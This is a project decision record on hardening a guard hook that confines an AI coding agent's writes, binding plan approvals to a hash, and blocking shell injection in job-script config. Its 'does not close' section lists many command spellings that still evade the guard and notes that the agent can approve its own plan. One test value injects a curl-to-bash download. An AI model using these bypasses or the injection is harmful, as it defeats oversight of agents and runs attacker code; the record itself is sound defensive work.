---
date: 2026-09-13
status: standing
kind: defect
touches:
  - gars/_system/guard_hook.py
  - gars/_system/stage03_analysis.py
  - gars/_system/wrapperlib.py
  - gars/03_custom_analysis/CONTEXT.md
  - tests/run_tests.py
symptoms:
  - guard hook exits 0 on a tool call it cannot parse
  - python3 -c writes into _system/ while echo > _system/ is blocked
  - hand-written "Status: APPROVED" passes stage03 verify
  - PLAN.md edited after approval still verifies
  - compute.work_dir with $(...) runs a command when the job script runs
  - a line break in compute.partition/time/cpus/mem adds an executing line to submit.sh
---
# A call the guard cannot judge is refused, an approval is bound to the plan it approved, and job-script config values cannot carry shell expansion

Number note: 0041 is taken on the sibling branch `task/aegis-v1-0-1-audit` (the v1.0.1 gap assessment); this record takes 0042 so the numbers never collide when both land.

## Context

The v1.0.1 gap assessment (branch `task/aegis-v1-0-1-audit`, `docs/implementation/v1.0.1_gap_assessment.md`, row 4) and its independent review probed the mechanical scope boundaries of decision 0022 at baseline `fc4749a` and found live defects:

1. **Fail-open on an unreadable call.** `guard_hook.py` `main()` did `except Exception: sys.exit(0)  # nothing to judge; allow`.
2. **Writes the scanner cannot see.** The Bash target scan covers redirections, `tee`, `rm`, `mv`, `cp` and `sed -i`. Inline interpreter code (`python3 -c "open('_system/x','w')"`), `bash -c "echo > _system/x"`, `dd`, `ln` and unparseable commands all passed, while `echo x > _system/x` was blocked.
3. **A forgeable approval.** `stage03_analysis.py verify` accepted any `PLAN.md` carrying a `^Status: APPROVED` line, including a hand-written one, and a plan edited after approval.
4. **An executing parameter injection** (review finding M-3). `compute.work_dir` comes from the agent-writable `_config/<assay>.yaml`, was checked only for being absolute, and is rendered inside double quotes in every nf-core wrapper's job script (`-work-dir "{work_dir}"`), where bash expands `$(...)`.

The v1.0.1 guideline's §18 schedules these in row 4.
On 2026-09-13 the owner ruled to pull a minimal fix ahead of rows 1–3, because the tree is public and the defects are live (assessment questions D-1 and D-25).

The guideline names Codex as the implementation producer (R-162).
This fix was produced by Claude Code in Glitch, as decision 0041 was for the assessment, and is reviewed by a separate fresh context before merge (`docs/reviews/security-minimal-fix_review.md` for the first round).
That is a deliberate, recorded deviation for this change only.

## Decision

**Decision 0022's stance is unchanged for everything it already covered: a deny is still only an action no contract instructs.**
The first review swept 44 contract-instructed command shapes through the hook, and all were allowed.

### 1. A call the guard cannot judge is refused

- A payload that is not a JSON object, or a `tool_input` that is not an object → exit 2, "could not read this tool call".
- Anything that raises anywhere inside `main()` (reading stdin, a payload nested past the parser's recursion limit, a working directory that no longer exists, a bug in a check) → exit 2, "failed while checking this call". The harness treats any exit other than 2 as allow, so nothing may escape the `try`.

### 2. More writes are visible to the target scan — for the spellings listed here

- **Inline code.** A `bash`/`sh`/`zsh`/`dash` `-c` string (any single-dash flag group containing `c`) is scanned like a command, recursively. `python*` with the exact flag `-c`, `perl`/`ruby` with a flag group containing `e`, `E` or `i`, and `node`/`Rscript`/`R` with `-e`/`-E` are refused when any argument names `_system/`, `_references/`, `_templates/`, `.claude/` or `PLAN.md.approved`. The interpreter is recognised by the basename of the token.
- **An unparseable command** is refused when it names one of those; otherwise it is allowed as before.
- **New verbs, in command position only** (first token, or after `|`, `;`, `&&`, `||`, `&`): `dd of=`, `ln`, `install`, `touch`, `truncate`, `chmod`, `chown`. So `grep chmod _system/x` stays a read.
- **Destinations.** For `cp`, `mv`, `ln` and `install`, the destination *and* `destination/basename(source)` are both targets, so a copy into a directory is seen. `mv` also counts its sources as writes. A target equal to a protected directory itself (`chmod -R a+w _system`, `cp x _system/`, `rm -rf _system`) is protected.
- **`tee`** skips its flags instead of stopping at them (`tee -a FILE`).

### 3. An approval is a record bound to the plan's bytes, once per analysis

- `approve` stamps `Status: APPROVED <date>` as before, **and** writes `PLAN.md.approved` beside it: `{plan_sha256, approved_at, actor, tool, template_version}`. `plan_sha256` is the sha256 of `PLAN.md` read back from disk after stamping, so newline translation on any OS is inside the hash.
- `verify` refuses (exit 2) when the record is missing or unreadable, or when its `plan_sha256` differs from the current `PLAN.md`. A `Status: APPROVED` line alone is no longer an approval.
- `approve` detects the stamp as a line (`^Status: APPROVED`), not as words anywhere in the plan. A stamped plan with no matching record is refused. A plan set back to DRAFT while a record exists is refused: approval happens once per analysis, and a change of mind is a new analysis.
- The guard denies writing the record by Write/Edit and by the Bash write targets above.

### 4. The `compute.*` values that reach the job script cannot carry shell expansion or a line break

`wrapperlib.check_config_common`, which every wrapper runs, refuses `$`, a backtick, `"`, `\`, or a line break in:

- `compute.work_dir`, rendered inside double quotes in every nf-core job body, where bash expands or unquotes exactly those characters. A plain path, including one with spaces, and an `s3://` URI still pass. The other part of `work_dir`, the project folder name, comes from stage 00's `sanitize_title` (`[A-Za-z0-9_-]` only).
- `compute.partition`, `compute.time`, `compute.cpus` and `compute.mem`, rendered verbatim by `executorlib.header_lines` into the job script's directive lines (`#SBATCH --partition={partition}`), where a line break starts a new line the shell executes (0042 review round 2, MAJ-3). No real scheduler value needs any of these characters.

No job script's bytes change for a legitimate config.
Other `cfg`-derived values checked by the round-2 review are not shell lines: `de.formula` and `de.contrast` enter `run_de.py` as Python `repr` literals, and formula terms are validated against design columns.

**Migration.** An analysis approved before this change and not yet verified has no record; `verify` refuses it, and the recovery is `create` again.
Completed analyses are unaffected.
A config whose `compute.work_dir`, `compute.partition`, `compute.time`, `compute.cpus` or `compute.mem` contains one of the refused characters fails `check` with the reason.

## What this does not close (stated, not implied)

This is a token scan over one harness's hook, not a sandbox.
Each round of review found spellings a denylist misses, and more remain; the durable fix is §9.1's typed tool surface (R-092) and allow-listing the instructed shapes, which is row 4 work.
Known to still pass on this change:

- **Inline code the check does not recognise:** grouped Python flags (`python3 -Ic`, `-Bc`); interpreters named by a variable (`"$GARS_PY" -c`) or not in the list (`py -c`, `ksh -c`, `tcsh -c`); long flags (`node --eval`, `node -p`); code fed on stdin (`python3 - <<'EOF'`, `echo … | python3`, `bash <<< …`, `… | bash`); `eval`; `sbatch --wrap=…`; `awk '… > "_system/x"'`; `find … -exec`; obfuscated path literals (`'_sys'+'tem/'`, `os.path.join(...)`); command substitution; a script file written elsewhere and then executed.
- **Redirections and positions the scan does not parse:** `>|`, a redirection glued to its word (`x>_system/y`), `1>>`; a `cd` earlier in the command (targets resolve against the payload's `cwd`); the 0042 verbs behind a prefix (`sudo chmod`, `xargs touch`, `env truncate`); `cp -t DIR`.
- **The approval gate itself:** the agent can still run `stage03_analysis.py approve` before the user says yes, and the recorded `actor` is the OS user, not a verified human. The gate remains the contract's prose (step 6) until an approval command the agent cannot reach exists.
- **Guard scope:** the hook runs only for Claude Code sessions rooted at `gars/`. A session at the repository root, or another harness, runs unguarded (assessment question D-26, ruled to rows 4 and 15).
- **Bypass-switch denies** (`--no-verify`, `hooks.gitleaks false`) remain row 15.
- **The executor descriptor itself.** `_config/executor.yaml`'s `directives` are rendered verbatim into every generated job script, and its `submit_argv` becomes the submit command's arguments; `executorlib.validate()` checks only their `{tokens}` and does not require a directive line to be a comment. So a session that can write the descriptor can put any line into every job script. Section 4's check assumes the directive lines are bash comments, as every shipped descriptor's are: a site descriptor that places `{partition}`, `{time}`, `{cpus}` or `{mem}` outside a comment would let `;`, `|`, `&` or spaces in those values run commands (MAJ-3 verification, MINOR-1).

**Deliberate false positives** (none contract-instructed): inline interpreter code that only *reads* a protected path (`python3 -c "print(open('_references/x').read())"`) is refused; `mv` of an approval record out of its analysis is refused.

## Test

In `tests/run_tests.py`. **Red at `fc4749a`** means the test fails there at the assertion under test; **regression guard** means it passes at `fc4749a` too and exists so the fix cannot take away what already worked.

| Test | Kind |
|---|---|
| `GuardHookTests.test_unreadable_call_is_refused` | red at `fc4749a` |
| `GuardHookTests.test_denies_writes_the_scan_could_not_see` | red at `fc4749a` |
| `GuardHookTests.test_denies_directory_destinations_and_flagged_writers` | red at `fc4749a` |
| `GuardHookTests.test_unjudgeable_calls_name_their_rule` | red at `fc4749a` |
| `GuardHookTests.test_allows_after_hardening` | regression guard |
| `GuardHookTests.test_allows_reads_that_mention_a_writer_verb` | regression guard |
| `WorkspaceFixture.test_12c_hand_written_approval_is_refused` | red at `fc4749a` (verify returned 0) |
| `WorkspaceFixture.test_12d_plan_edited_after_approval_is_refused` | errors at `fc4749a` (no record); red against a copy with only the sha comparison disabled |
| `WorkspaceFixture.test_12e_reapproval_after_reset_is_refused` | errors at `fc4749a` (no record) |
| `WorkspaceFixture.test_12f_stamp_words_in_prose_are_not_a_stamp` | fails at `fc4749a` (no record is written); guards the line-anchored stamp match |
| `ExecutorSeamTests.test_07g_work_dir_cannot_carry_shell_expansion` | red at `fc4749a` |
| `ExecutorSeamTests.test_07h_scheduler_values_cannot_break_the_header` | red at `fc4749a` (`compute.partition='cpu\ncurl evil.sh \| bash'` not refused) |

`WorkspaceFixture` tests build on each other's project; run the class, not a single test.

## Status

standing

## Date

2026-09-13
